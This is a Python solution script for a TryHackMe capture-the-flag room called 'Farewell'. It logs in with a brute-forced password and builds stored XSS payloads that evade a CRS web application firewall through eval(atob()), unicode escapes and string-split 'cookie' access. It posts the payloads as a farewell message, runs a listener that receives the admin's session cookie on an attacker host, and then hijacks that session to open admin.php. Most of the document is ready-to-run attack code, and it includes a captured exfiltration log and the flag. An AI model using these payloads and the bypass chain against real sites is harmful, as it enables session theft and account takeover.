#!/usr/bin/env python3
"""
Farewell TryHackMe – Flag 2: Stored XSS → Admin Cookie Theft → admin.php

Attack flow:
  1. Login as deliver11 (password from Flag 1)
  2. Submit farewell message with XSS payload (100 char limit!)
  3. WAF blocks: <img onerror>, document.cookie directly
  4. Bypass: <body onload> + document['coo'+'kie'] string-concat
  5. Admin reviews message → XSS triggers → cookie exfiltrated to listener
  6. Use admin's PHPSESSID to access /admin.php → Flag 2

Usage:
  # Full auto: login + XSS + listener + grab flag
  python farewell_second.py --target 10.80.159.6 --password Tokyo???? --attackbox 10.80.97.140

  # If you already have admin's cookie
  python farewell_second.py --target 10.80.159.6 --admin-cookie "PHPSESSID=abc123"


  Listening on 0.0.0.0 8000
Connection received on 10.80.159.6 51120
GET /?c=PHPSESSID=vrkbhghdsce5v3ferdnlvh8su5 HTTP/1.1
Host: 10.80.97.140:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://localhost/
Accept-Encoding: gzip, deflate

THM{ADMINP@wned007}
"""

from __future__ import annotations

import argparse
import http.server
import random
import re
import socketserver
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
STOLEN_COOKIE: str | None = None
COOKIE_EVENT = threading.Event()


def rand_str(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_letters, k=n))


def get(url: str, cookies: str = "", timeout: float = 10) -> tuple[int, str]:
    headers = {"User-Agent": UA}
    if cookies:
        headers["Cookie"] = cookies
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def post_form(url: str, data: str, cookies: str = "", content_type: str = "application/x-www-form-urlencoded; charset=UTF-8", timeout: float = 10) -> tuple[int, str, str]:
    """POST with raw data string. Returns (code, body, new_session_cookie)."""
    headers = {
        "User-Agent": UA,
        "Content-Type": content_type,
        "Accept": "*/*",
        "Origin": url.rsplit("/", 1)[0],
        "Referer": url.rsplit("/", 1)[0] + "/",
    }
    if cookies:
        headers["Cookie"] = cookies

    req = urllib.request.Request(url, data=data.encode(), method="POST", headers=headers)
    new_session = cookies
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            for c in (resp.headers.get_all("Set-Cookie") or []):
                if "PHPSESSID" in c:
                    new_session = c.split(";")[0]
            return resp.getcode(), body, new_session
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body, new_session
    except Exception as e:
        return 0, str(e), new_session


# ── Cookie listener ─────────────────────────────────────────────────────────
class CookieHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global STOLEN_COOKIE
        parsed = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        cookie_val = qs.get("c", [""])[0]
        src = f"{self.client_address[0]}:{self.client_address[1]}"

        if cookie_val and not STOLEN_COOKIE:
            STOLEN_COOKIE = cookie_val
            print(f"\n{'=' * 60}")
            print(f"[!!!] ADMIN COOKIE STOLEN from {src}")
            print(f"[!!!] Cookie: {STOLEN_COOKIE}")
            print(f"{'=' * 60}\n")
            COOKIE_EVENT.set()

        if self.path != "/favicon.ico":
            print(f"[listener] {src} → {self.path[:200]}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        return


def start_listener(port: int) -> socketserver.TCPServer:
    server = socketserver.ThreadingTCPServer(("0.0.0.0", port), CookieHandler)
    server.daemon_threads = True
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[listener] Started on 0.0.0.0:{port}")
    return server


# ── Login as deliver11 ──────────────────────────────────────────────────────
def login(target: str, username: str, password: str) -> str | None:
    """Login and return session cookie."""
    base = f"http://{target}"

    # Get fresh session
    headers = {"User-Agent": UA}
    req = urllib.request.Request(base, headers=headers)
    session = ""
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            for c in (resp.headers.get_all("Set-Cookie") or []):
                if "PHPSESSID" in c:
                    session = c.split(";")[0]
    except Exception:
        pass

    data = f"username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}"
    code, body, session = post_form(f"{base}/auth.php", data, session)

    if code == 200 and "auth_failed" not in body:
        print(f"[+] Logged in as {username}")
        print(f"[+] Session: {session}")
        return session
    else:
        print(f"[!] Login failed ({code}): {body[:200]}")
        return None


# ── XSS Injection ───────────────────────────────────────────────────────────
def build_xss_payloads(attackbox: str, port: int) -> list[tuple[str, str]]:
    """
    Build multiple XSS payloads ordered by likelihood of bypassing the WAF.

    CRS 3.3.5 bypass (from waf_hunt):
      <a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("B64"))>click</a>
    where B64 = base64 of the JS that exfils cookies.

    Returns list of (name, payload) tuples.
    """
    import base64

    callback = f"http://{attackbox}:{port}"

    # ── JS snippets to base64-encode ──
    # Variant A: new Image (classic)
    js_a = f"new Image().src='{callback}?c='+document.cookie"
    # Variant B: fetch (simpler)
    js_b = f"fetch('{callback}?c='+document.cookie)"

    payloads: list[tuple[str, str]] = []

    # ── 1. <a href> + eval(atob()) + Unicode + HTML entities  (CRS 3.3.5 bypass) ──
    for label, js in [("a-href-img", js_a), ("a-href-fetch", js_b)]:
        b64 = base64.b64encode(js.encode()).decode()
        p = f'<a href=ja&#x0D;vascript&colon;\\u0065val(\\u0061tob("{b64}"))>click</a>'
        payloads.append((f"{label} (eval+atob+unicode)", p))

    # ── 2. <body onload> + string-concat (previous approach) ──
    p2 = f"""<body onload="new Image().src='{callback}?c='+document['coo'+'kie'];">"""
    payloads.append(("body-onload-concat", p2))

    # ── 3. <svg onload> variant ──
    b64_a = base64.b64encode(js_a.encode()).decode()
    p3 = f'<svg onload=eval(atob("{b64_a}"))>'
    payloads.append(("svg-onload-atob", p3))

    # ── 4. <img onerror> + atob ──
    p4 = f'<img src=x onerror=eval(atob("{b64_a}"))>'
    payloads.append(("img-onerror-atob", p4))

    # Print all options
    print(f"[+] Generated {len(payloads)} XSS payloads:")
    for name, p in payloads:
        print(f"    [{len(p):3d} chars] {name}")
        print(f"             {p[:120]}{'...' if len(p) > 120 else ''}")

    return payloads


def submit_message(target: str, session: str, payloads: list[tuple[str, str]]) -> bool:
    """Submit farewell messages via POST /dashboard.php field=farewell_message."""
    base = f"http://{target}"
    submit_url = f"{base}/dashboard.php"

    for pname, payload in payloads:
        print(f"\n[XSS] Trying payload: {pname} ({len(payload)} chars)")
        data = f"farewell_message={urllib.parse.quote(payload)}"
        code, body, session = post_form(submit_url, data, session)

        if code == 403:
            print(f"[!] WAF BLOCKED: '{pname}'")
            continue  # try next payload

        if code == 200:
            low = body.lower()
            if any(kw in low for kw in ("success", "submitted", "posted", "approved", "review", "pending", "saved", "farewell")):
                print(f"[+] Payload ACCEPTED! ({pname})")
                return True
            # Check if it silently worked (page re-rendered with our payload in it)
            if payload[:20] in body or "click</a>" in body:
                print(f"[+] Payload appears in page source — ACCEPTED!")
                return True
            preview = body[:300].replace("\n", " ")
            print(f"[?] Response ({code}, {len(body)} bytes): {preview}")
        else:
            print(f"[!] Unexpected response: {code}")

    print("\n[!] No payload was accepted by the WAF")
    print("[i] Try submitting manually in browser at /dashboard.php")
    print(f"[i] Session: {session}")
    if payloads:
        print(f"[i] Best payload to try manually:")
        print(f"    {payloads[0][1]}")
    return False


# ── Grab admin flag ─────────────────────────────────────────────────────────
def grab_admin_flag(target: str, cookie: str) -> str | None:
    """Use admin cookie to find Flag 2."""
    base = f"http://{target}"

    if not cookie.startswith("PHPSESSID="):
        cookie = f"PHPSESSID={cookie}"

    print(f"\n[+] Accessing admin pages with stolen cookie...")

    # The writeup says flag is at /admin.php
    pages = ["/admin.php", "/dashboard.php", "/review.php", "/", "/index.php",
             "/panel.php", "/flag.php", "/messages.php", "/home.php"]

    for path in pages:
        code, body = get(f"{base}{path}", cookies=cookie)
        if code == 200:
            flags = re.findall(r'(?:THM|flag)\{[^}]+\}', body, re.I)
            if flags:
                print(f"\n{'=' * 60}")
                print(f"[!!!] FLAG 2 FOUND at {path}:")
                for f in flags:
                    print(f"      {f}")
                print(f"{'=' * 60}")
                return flags[0]

            if "admin" in body.lower() or "review" in body.lower():
                print(f"[+] {path} → admin page ({len(body)} bytes)")
                preview = body[:500].replace("\n", " ")
                print(f"    Preview: {preview[:200]}")

    print("[!] Flag not found in pages")
    print(f"[i] Cookie: {cookie}")
    print("[i] Check /admin.php manually in browser")
    return None


# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Farewell Flag 2: Stored XSS → steal admin cookie → admin.php"
    )
    parser.add_argument("--target", default="10.80.159.6", help="Target IP")
    parser.add_argument("--user", default="deliver11", help="Username to login with")
    parser.add_argument("--password", required=False, help="Password for deliver11")
    parser.add_argument("--attackbox", default="10.80.97.140", help="AttackBox IP for callback")
    parser.add_argument("--port", type=int, default=8000, help="Listener port")
    parser.add_argument("--admin-cookie", help="Skip XSS, use admin cookie directly")
    parser.add_argument("--wait", type=int, default=120, help="Wait time for admin review (seconds)")
    args = parser.parse_args()

    # ── If admin cookie provided, skip to flag ──
    if args.admin_cookie:
        grab_admin_flag(args.target, args.admin_cookie)
        return

    if not args.password:
        print("[!] Need --password for deliver11 (from Flag 1 bruteforce)")
        print("[i] Run farewell_first.py first to get the password")
        return

    # ── Step 1: Login as deliver11 ──
    print("=" * 60)
    print("[1] Logging in as deliver11...")
    print("=" * 60)
    session = login(args.target, args.user, args.password)
    if not session:
        return

    # ── Step 2: Build XSS payloads ──
    print(f"\n{'=' * 60}")
    print("[2] Preparing XSS payloads (eval+atob CRS bypass)...")
    print("=" * 60)
    payloads = build_xss_payloads(args.attackbox, args.port)

    # ── Step 3: Start listener ──
    print(f"\n{'=' * 60}")
    print("[3] Starting cookie listener...")
    print("=" * 60)
    server = start_listener(args.port)

    # ── Step 4: Submit XSS message (tries each payload) ──
    print(f"\n{'=' * 60}")
    print("[4] Submitting XSS payloads as farewell message...")
    print("=" * 60)
    submit_message(args.target, session, payloads)

    # ── Step 5: Wait for admin to review ──
    print(f"\n{'=' * 60}")
    print(f"[5] Waiting up to {args.wait}s for admin to review message...")
    print("=" * 60)
    print("[+] Admin cookie will appear here when captured.\n")

    COOKIE_EVENT.wait(timeout=args.wait)

    if STOLEN_COOKIE:
        grab_admin_flag(args.target, STOLEN_COOKIE)
    else:
        print("\n[!] No cookie received – timeout")
        print("[i] Possible issues: AttackBox not reachable, WAF blocked payload, message not submitted")
        print(f"[i] Try submitting manually in browser:")
        print(f"    Payload: {payload}")
        print(f"[i] Listener still running, Ctrl+C to stop")
        try:
            while True:
                time.sleep(5)
                if STOLEN_COOKIE:
                    grab_admin_flag(args.target, STOLEN_COOKIE)
                    break
        except KeyboardInterrupt:
            pass

    server.shutdown()


if __name__ == "__main__":
    main()
